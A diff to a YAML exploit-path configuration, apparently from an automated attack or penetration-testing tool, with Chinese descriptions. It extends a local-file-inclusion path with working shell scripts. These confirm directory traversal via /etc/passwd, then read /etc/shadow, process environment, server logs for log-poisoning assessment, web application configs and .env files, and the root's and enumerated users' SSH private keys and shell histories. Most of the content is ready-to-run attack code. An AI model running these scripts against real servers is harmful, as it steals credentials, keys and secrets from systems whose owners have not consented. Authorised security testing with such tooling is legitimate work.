@@ -361,37 +361,50 @@ exploit_paths:
           shell_type: "rce_apache_log_poison"
 
   - path_id: lfi_sensitive_read
-    name: "LFI 敏感文件读取（/etc/passwd + 高价值文件）"
+    name: "LFI 敏感文件深度读取（验证 + 批量敏感文件探测）"
     priority: 3
     conditions:
       lfi_confirmed: true
     steps:
       - id: read_passwd_confirm
-        description: "使用已确认参数和深度读取 /etc/passwd"
+        description: "Stage 2: 验证目录遍历 — 使用已确认参数和深度读取 /etc/passwd"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
 
-          CONFIRMED_PARAM="{lfi_param}"
-          CONFIRMED_DEPTH="{lfi_depth}"
-          [ "$CONFIRMED_PARAM" = "{lfi_param}" ] && CONFIRMED_PARAM=""
-          [ "$CONFIRMED_DEPTH" = "{lfi_depth}" ] && CONFIRMED_DEPTH=""
+          LFI_PARAM="{lfi_param}"
+          LFI_DEPTH="{lfi_depth}"
+          LFI_PATH="{lfi_path}"
+          [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM=""
+          [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH=""
+          [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
 
-          if [ -n "$CONFIRMED_PARAM" ] && [ -n "$CONFIRMED_DEPTH" ]; then
-            TRAV=$(printf '../%.0s' $(seq 1 $CONFIRMED_DEPTH))
-            URL="$BASE/?$CONFIRMED_PARAM=${TRAV}etc/passwd"
-            echo "[PROBE] $URL (confirmed param=$CONFIRMED_PARAM depth=$CONFIRMED_DEPTH)"
+          build_url() {
+            local target_file="$1"
+            local TRAV
+            TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+            if [ -n "$LFI_PATH" ]; then
+              echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+            else
+              echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+            fi
+          }
+
+          if [ -n "$LFI_DEPTH" ] && { [ -n "$LFI_PATH" ] || [ -n "$LFI_PARAM" ]; }; then
+            URL=$(build_url "etc/passwd")
+            echo "[PROBE] $URL (param=$LFI_PARAM path=$LFI_PATH depth=$LFI_DEPTH)"
             result=$(curl -s "$URL" --max-time 6 2>/dev/null)
             if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
-              echo "[HIT] LFI_PASSWD_OK:$CONFIRMED_PARAM:$CONFIRMED_DEPTH"
+              echo "[HIT] LFI_PASSWD_OK"
               echo "$result"
               exit 0
             fi
           fi
 
           for depth in 1 2 3 4 5 6 7 8 9 10; do
-            TRAV=$(printf '../%.0s' $(seq 1 $depth))
+            LFI_DEPTH="$depth"
             for param in page file include path image content template; do
-              URL="$BASE/?$param=${TRAV}etc/passwd"
+              LFI_PARAM="$param"
+              URL=$(build_url "etc/passwd")
               echo "[PROBE] $URL"
               result=$(curl -s "$URL" --max-time 6 2>/dev/null)
               if echo "$result" | grep -qE '^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:'; then
@@ -405,8 +418,123 @@ exploit_paths:
         timeout: 60
         success_criteria:
           stdout_regex: "^[a-z_][a-z0-9_.-]*:[^:]*:[0-9]+:[0-9]+:"
-        on_success: conclude_success
+        on_success: read_high_value_files
         on_fail: next_path
+        evidence_capture:
+          shell_type: "file_read"
+
+      - id: read_high_value_files
+        description: "Stage 3: 深度探测 — 批量读取敏感文件（shadow/SSH密钥/日志/配置）+ 枚举用户文件"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          echo "=== LFI Sensitive File Deep Enumeration ==="
+
+          LFI_PARAM="{lfi_param}"
+          LFI_DEPTH="{lfi_depth}"
+          LFI_PATH="{lfi_path}"
+          [ "$LFI_PARAM" = "{lfi_param}" ] && LFI_PARAM=""
+          [ "$LFI_DEPTH" = "{lfi_depth}" ] && LFI_DEPTH="5"
+          [ "$LFI_PATH" = "{lfi_path}" ] && LFI_PATH=""
+          [ -z "$LFI_PARAM" ] && [ -z "$LFI_PATH" ] && LFI_PARAM="page"
+
+          build_url() {
+            local target_file="$1"
+            local TRAV
+            TRAV=$(printf '../%.0s' $(seq 1 $LFI_DEPTH))
+            if [ -n "$LFI_PATH" ]; then
+              echo "$BASE${LFI_PATH}${TRAV}${target_file}"
+            else
+              echo "$BASE/?$LFI_PARAM=${TRAV}${target_file}"
+            fi
+          }
+
+          FOUND_COUNT=0
+          FOUND_FILES=""
+
+          try_read() {
+            local label="$1"
+            local file_path="$2"
+            local url
+            url=$(build_url "$file_path")
+            echo "[READ] $url"
+            local result
+            result=$(curl -s "$url" --max-time 6 2>/dev/null)
+            local size=${#result}
+            if [ "$size" -gt 10 ] && ! echo "$result" | grep -qi "not found\|no such\|failed to open\|warning.*include\|<html\|<!DOCTYPE"; then
+              FOUND_COUNT=$((FOUND_COUNT + 1))
+              FOUND_FILES="$FOUND_FILES $label"
+              echo "[HIT] $label ($size bytes)"
+              echo "$result" | head -12
+              echo "---"
+              return 0
+            else
+              echo "[MISS] $label (${size}B)"
+              return 1
+            fi
+          }
+
+          echo "--- [1/4] 系统凭据与密码文件 ---"
+          try_read "/etc/shadow" "etc/shadow"
+          try_read "/etc/master.passwd" "etc/master.passwd"
+
+          echo "--- [2/4] 系统与进程信息 ---"
+          try_read "/etc/hosts" "etc/hosts"
+          try_read "/etc/hostname" "etc/hostname"
+          try_read "/proc/version" "proc/version"
+          try_read "/proc/self/environ" "proc/self/environ"
+          try_read "/proc/self/cmdline" "proc/self/cmdline"
+          try_read "/proc/self/status" "proc/self/status"
+
+          echo "--- [3/4] 日志文件（用于日志注入 RCE 评估）---"
+          try_read "auth.log" "var/log/auth.log"
+          try_read "secure" "var/log/secure"
+          try_read "apache2/access.log" "var/log/apache2/access.log"
+          try_read "apache2/error.log" "var/log/apache2/error.log"
+          try_read "nginx/access.log" "var/log/nginx/access.log"
+          try_read "nginx/error.log" "var/log/nginx/error.log"
+          try_read "httpd/access_log" "var/log/httpd/access_log"
+          try_read "syslog" "var/log/syslog"
+
+          echo "--- [4/4] 应用配置与密钥文件 ---"
+          try_read ".htpasswd" "var/www/html/.htpasswd"
+          try_read "config.php" "var/www/html/config.php"
+          try_read "wp-config.php" "var/www/html/wp-config.php"
+          try_read ".env" "var/www/html/.env"
+          try_read "db.php" "var/www/html/db.php"
+          try_read "settings.php" "var/www/html/sites/default/settings.php"
+          try_read "apache2.conf" "etc/apache2/apache2.conf"
+          try_read "000-default.conf" "etc/apache2/sites-enabled/000-default.conf"
+          try_read "nginx-default" "etc/nginx/sites-enabled/default"
+          try_read "/root/.ssh/id_rsa" "root/.ssh/id_rsa"
+          try_read "/root/.ssh/authorized_keys" "root/.ssh/authorized_keys"
+          try_read "/root/.bash_history" "root/.bash_history"
+
+          echo ""
+          echo "--- [枚举用户 SSH 密钥与历史] ---"
+          passwd_url=$(build_url "etc/passwd")
+          PASSWD=$(curl -s "$passwd_url" --max-time 6 2>/dev/null)
+          USERS=$(echo "$PASSWD" | grep -E ':/home/' | cut -d: -f1)
+          if [ -n "$USERS" ]; then
+            echo "发现用户: $USERS"
+            for user in $USERS; do
+              try_read "/home/$user/.ssh/id_rsa" "home/$user/.ssh/id_rsa"
+              try_read "/home/$user/.ssh/authorized_keys" "home/$user/.ssh/authorized_keys"
+              try_read "/home/$user/.bash_history" "home/$user/.bash_history"
+              try_read "/home/$user/.mysql_history" "home/$user/.mysql_history"
+            done
+          else
+            echo "未发现 /home/ 用户"
+          fi
+
+          echo ""
+          echo "=== 深度探测完成: $FOUND_COUNT 个文件可读 ==="
+          echo "可读文件列表:$FOUND_FILES"
+          [ "$FOUND_COUNT" -gt 0 ] && echo "SENSITIVE_FILES_FOUND" || echo "SENSITIVE_FILES_EMPTY"
+        timeout: 120
+        success_criteria:
+          stdout_not_empty: true
+        on_success: conclude_success
+        on_fail: conclude_success
         evidence_capture:
           shell_type: "file_read"
 
